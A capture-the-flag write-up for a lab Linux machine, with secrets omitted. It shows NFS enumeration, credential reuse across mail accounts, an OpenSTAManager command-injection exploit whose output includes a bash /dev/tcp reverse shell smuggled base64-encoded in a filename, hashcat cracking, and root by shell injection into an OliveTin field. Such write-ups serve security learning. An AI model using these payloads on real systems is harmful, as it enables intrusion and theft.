## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Season - 11 Machine 
Reactor  - Easy   - Linux
```
## IP-Address
```Machine Information
10.129.143.51
```
## Set MTU
```bash
sudo ip link set dev tun0 mtu 1200
```
----
## Enumeration
- Port Scanning
```bash
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp    open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD
110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL CAPA PIPELINING STLS UIDL AUTH-RESP-CODE TOP RESP-CODES
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      39921/udp   mountd
|   100005  1,2,3      58301/tcp   mountd
|   100021  1,3,4      32891/tcp   nlockmgr
|   100021  1,3,4      56581/udp   nlockmgr
|   100024  1          46062/udp   status
|   100024  1          47427/tcp   status
|_  100227  3           2049/tcp   nfs_acl
143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: STARTTLS LOGIN-REFERRALS ID more have post-login listed LITERAL+ ENABLE LOGINDISABLEDA0001 Pre-login SASL-IR IMAP4rev1 OK capabilities IDLE
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
993/tcp   open  imaps?   syn-ack ttl 63
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
|_imap-capabilities: LOGIN-REFERRALS ID more Pre-login post-login listed capabilities ENABLE have OK SASL-IR IMAP4rev1 LITERAL+ AUTH=PLAINA0001 IDLE
|_ssl-date: TLS randomness does not represent time
995/tcp   open  pop3s?   syn-ack ttl 63
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
| SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUDIVPMnvnZ7MqOX9P3XD6FaMUGLYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZW5pZ21hMB4XDTI2MDIxODIwMzMzM1oXDTM2MDIxNjIw
| MzMzM1owETEPMA0GA1UEAwwGZW5pZ21hMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkSnxU+24XgWM3KXxLy4mCk7AclfQyAQlcr8Gm7L3E3gdkF74wSZy
| i00pixUHKlKqrPQwSpNqsWMqi1ggBZQzd2jBRKzpQQflMUzI8uoUjkBlaFqKCli5
| cJgyL/WcOylWDTdBXeIyBUBDN1duzVa/BDTV83inPH+Fs5rpesSJ/Jwsv4432dtb
| SGAe6YuR4PIpgI33GvPoW3uSfE/yMGffwRf0RONTcsbsNC8reb3XKqa9eNfrmYb3
| S9/L/3dK04fZRU1gk4vRt0xY60VSgQXJqQwfsTUxcNqwYL0bZ0u5bEfV6ITwNO5F
| DZ11EkqkJCFx6pVgWRmnfC0XNMi5IHW3mwIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmVuaWdtYTAdBgNVHQ4EFgQUHA8z2wPX5Qj2TV6SafL8f2LRoDsw
| DQYJKoZIhvcNAQELBQADggEBADr3VEq/+YzDltVRbBvjGeCCm2A2+5nAniEJE/oA
| CkQDVHgYrMH/7L0z0kocq0e54Mk+iRRPKjP4bF4FhG2syeaE2o1aqH6C3GIoBvRZ
| 79XCkgxf5XDlECId1en+KS+iX2ssSmFWEU7l9+OnIRY1QA91OekD2OznIfAeXjaw
| O4SWzae1MrGM0venQ1RugTWa9JoL6G2BUtqIGDyw3QRxmx3HKStMtfHqdq2vzFjA
| LsK4A5j7mMDujaq55Nsc4/Su0ShQKPW3A1X7C1Y9c492g9Z0R5GL17CrmYJIVPX2
| +LC3TWgrRUQ6i5qZ7/9jU198FGNUlRGQi304f+XlxhVqTHI=
|_-----END CERTIFICATE-----
|_pop3-capabilities: USER CAPA PIPELINING SASL(PLAIN) UIDL AUTH-RESP-CODE TOP RESP-CODES
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
32891/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
39279/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
46101/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
47427/tcp open  status   syn-ack ttl 63 1 (RPC #100024)
58301/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
```
----
## Enumeration
- Port 80 - Browser webpage not available - Faced multiple error with brave browser
- Switch to `Firefox` & `chromium`
```bash
$ curl -I http://enigma.htb/
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 01 Jul 2026 13:18:46 GMT
Content-Type: text/html
Content-Length: 31133
Last-Modified: Thu, 19 Feb 2026 20:16:05 GMT
Connection: keep-alive
ETag: "69976f85-799d"
Accept-Ranges: bytes
```
- NFS 
```bash
$ rpcinfo -p $TARGET
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  45173  mountd
    100005    1   tcp  57597  mountd
    100005    2   udp  36437  mountd
    100005    2   tcp  36235  mountd
    100005    3   udp  57169  mountd
    100005    3   tcp  42727  mountd
    100024    1   udp  33618  status
    100024    1   tcp  42185  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  60626  nlockmgr
    100021    3   udp  60626  nlockmgr
    100021    4   udp  60626  nlockmgr
    100021    1   tcp  42477  nlockmgr
    100021    3   tcp  42477  nlockmgr
    100021    4   tcp  42477  nlockmgr

```
- Mount Directory
```bash
$ showmount -e $TARGET
Export list for 10.129.143.51:
/srv/nfs/onboarding *
$ mkdir -p /mnt/onboarding
mkdir: cannot create directory ‘/mnt/onboarding’: Permission denied
$ sudo mkdir -p /mnt/onboarding
[sudo] password for kali:
$ sudo mount -t nfs -o nolock $TARGET:/srv/nfs/onboarding /mnt/onboarding
$ cd /mnt/onboarding
$ ls
New_Employee_Access.pdf
```
- Faced errors with NFS too by Server-side.
- `Pdftotext` to investigate inside the file `New_Employee_Access.pdf`
```bash
$ cat New_Employee_Access.txt
Enigma Corp
IT Department - New Employee System Access
Employee:
Kevin Mitchell
Department:
Operations
Provisioned by:
IT Department
Date:
2024-03-01
Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: [password omitted]
Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.
```
- New Findings
```Creds 
URL: http://mail001.enigma.htb
Username: kevin
Password: [password omitted]
```
- Add `mail001.enigma.htb` in `/etc/hosts`.
- Another mail to `kevin` from `sarah`
```mail
Hi Kevin,
Welcome to the team! We're thrilled to have you on board at Enigma Corp.
A little about us â€” Enigma Corp is a mid-sized technology and operations firm specializing in infrastructure management and enterprise solutions. We've been growing rapidly over the past few years and we're excited to have fresh talent joining us.
I'm Sarah from the Accounts department. I'll be your point of contact for any finance-related queries during your onboarding period.
We're still finalizing a few of your onboarding details â€” your system access, equipment setup, and department introductions are all being arranged by the IT team. You should be receiving your access credentials shortly via the company shared drive.
In the meantime, don't hesitate to reach out if you have any questions. We want to make sure your first few days are as smooth as possible.
Looking forward to working with you!
Best regards,
Sarah
Accounts Department
Enigma Corp
sarah@enigma.htb
```
- Another user identified `sarah@enigma.htb`
- Trying the same onboarding password as `kevin` and it actually works
```bash
User - sarah
Pass - [password omitted]
```
- Found another Mail
```mail
Hi Sarah,
Apologies for the delay. I have provisioned your access. Please find the details below:
URL: http://support_001.enigma.htb
Username: admin
Password: [password omitted]
Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.
Regards,
IT Support
Enigma Corp
```
- New Creds with another subdomain - Add inside `/etc/hosts`
```Creds
URL: http://support_001.enigma.htb
Username: admin
Password: [password omitted]
```
- Login `http://support_001.enigma.htb` 
- Found another vulnerability about the `OpenSTAManager` - #CVE-2026-69212 
- Create Payload named - CVE-2026-69212.py in Exploit Folder
```bash
 python3 exploit.py -u http://support_001.enigma.htb -U admin -P [password omitted] --lhost 10.10.14.24 --lport 4444
CVE-2025-69212 | OpenSTAManager <= 2.9.8 | OS Command Injection
GHSA-25fp-8w8p-mx36 | src/Util/XML.php exec() unsanitized P7M filename
--------------------------------------------------------
  REVERSE SHELL
--------------------------------------------------------
    LHOST   : 10.10.14.24
    LPORT   : 4444
    Payload : bash -i >& /dev/tcp/10.10.14.24/4444 0>&1
    [!] Make sure your listener is running: nc -lvnp 4444
--------------------------------------------------------
  EXPLOITATION
--------------------------------------------------------
[*] Logging in as admin ...
[+] Login successful!
[*] Building malicious ZIP ...
    Filename  : invoice.p7m";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNC80NDQ0IDA+JjE=|base64 -d|bash;echo ".p7m
[*] Sending payload to http://support_001.enigma.htb/actions.php ...
[+] Payload fired! (connection held open by bash — that's expected)
[+] Check your nc listener for a shell!
[+] Done.
```
- Reverse-shell as `www-data`
```bash
www-data@enigma:~/html/openstamanager$ ls -la
ls -la
total 2620
drwxr-xr-x  18 www-data www-data   4096 Jun 23 14:14 .
drwxr-xr-x   5 root     root       4096 Jun 23 14:14 ..
-rw-r--r--   1 www-data www-data    166 Dec 23  2025 .editorconfig
-rw-r--r--   1 www-data www-data   3181 Dec 23  2025 .gitattributes
-rw-r--r--   1 www-data www-data   1151 Dec 23  2025 .gitignore
-rw-r--r--   1 www-data www-data   3270 Dec 23  2025 .htaccess
-rw-r--r--   1 www-data www-data  99021 Dec 23  2025 .php-cs-fixer.cache
-rw-r--r--   1 www-data www-data    605 Dec 23  2025 .php-cs-fixer.php
-rw-r--r--   1 www-data www-data    603 Dec 23  2025 .sami
drwxr-xr-x   2 www-data www-data   4096 Jun 23 14:14 .yarn
-rw-r--r--   1 www-data www-data     25 Dec 23  2025 .yarnrc.yml
drwxr-xr-x   2 www-data www-data   4096 Jun 23 14:14 api
drwxr-xr-x   4 www-data www-data   4096 Jun 23 14:14 assets
drwxr-xr-x   2 www-data www-data   4096 Jun 23 14:14 config
-rw-r--r--   1 www-data www-data   2065 Dec 23  2025 config.example.php
-rw-r--r--   1 www-data www-data   2044 Feb 18 19:29 config.inc.php
-rw-r--r--   1 www-data www-data   2061 Feb 18 19:06 config.php
-rw-r--r--   1 www-data www-data    577 Feb 18 19:20 manifest.json
-rw-r--r--   1 www-data www-data 264902 Dec 22  2025 mariadb_10_x.json
drwxr-xr-x  87 www-data www-data   4096 Jun 23 14:14 modules
-rw-r--r--   1 www-data www-data  61533 Dec 23  2025 modules.json
-rw-r--r--   1 www-data www-data 268220 Dec 23  2025 mysql.json
-rw-r--r--   1 www-data www-data 268221 Dec 22  2025 mysql_8_3.json
drwxr-xr-x  15 www-data www-data   4096 Jun 23 14:14 src
```
- Found another Database `Config.inc.php`
```bash
cat config.inc.php
<?php
/*
 * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
 * Copyright (C) DevCode s.r.l.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = '[password omitted]';
$db_name = 'openstamanager';
```
- Database - `openstamanager` , table -  `zz_users` - Users - `admin` & `haris`
```bash
mysql> SELECT * FROM zz_users LIMIT 10;
|  1 | admin    | [hash omitted] | admin@enigma.htb |

|  2 | haris    | [hash omitted] | haris@enigma.htb      
```
- Decrypt the hash
```bash
$ haiti '[hash omitted]' --hashcat-only
bcrypt [HC: 3200]
Blowfish(OpenBSD) [HC: 3200]
Woltlab Burning Board 4.x
bcrypt(sha256($pass)) / bcryptsha256 [HC: 30600]

└─$ echo '[hash omitted]' > hash.txt

└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
cracked
[hash omitted]:[password omitted]
```
----
##### SSH
```bash
$ ssh haris@enigma.htb
Password - [password omitted]

haris@enigma:~$ cat user.txt
[flag omitted]
```
- Enumeration using `lse.sh` & `linpeas.sh`
```bash
$ ps aux | grep -i OliveTin
root  1534  ...  /usr/local/bin/OliveTin

$ ss -lntp
127.0.0.1:1337
```
- Reviewing the Configuration
```bash
cat /etc/OliveTin/config.yaml
authRequireGuestsToLogin: false

- Guest can execute actions
  defaultPermissions:
  view: true
  exec: true
  logs: true
```
- Intended Vulnerable Actions
```bash
- title: Backup Database
  shell: mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
  - `db_user`
  - `db_pass`
  - `db_name`
```
- Testing Input Validation
```bash
invalid argument db_name, doesn't match ascii_identifier
invalid argument db_user, doesn't match ascii_identifier
- db_pass = 
  exit status 2
sh: 1: Syntax error: Unterminated quoted string
```
- `db_pass` proved 
	- User can execute the `/bin/sh` as `root`
	- user input was inserted directly into a single-quoted shell string
- Lets forward the Localhost port 1337 to attack machine to access the `GUI`
```bash
Used actions
 - Backup Database 
   - db_user: default
   - db_pass: '; id;#'
   - db_name: default
```
- Response - `uid=0(root) gid=0(root) groups=0(root)`
##### Root Shell
- Root 
```bash
$whoami
root
$id
uid=0(root) gid=0(root) groups=0(root)
$pwd
/
$cat /root/root.txt
[flag omitted]
```
- Root Flag
```bash
[flag omitted]
```

# Root Cause Analysis

The privilege escalation stemmed from an unsafe shell command inside the OliveTin configuration.

```
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

Although `db_user` and `db_name` were protected using the `ascii_identifier` validator, the **db_pass** parameter was inserted directly into a single-quoted shell command without proper escaping.

By prematurely terminating the quoted string, it became possible to inject arbitrary shell commands, which were executed by the OliveTin service running as **root**.

This resulted in a reliable command injection vulnerability and a straightforward privilege escalation from `haris` to `root`.
# END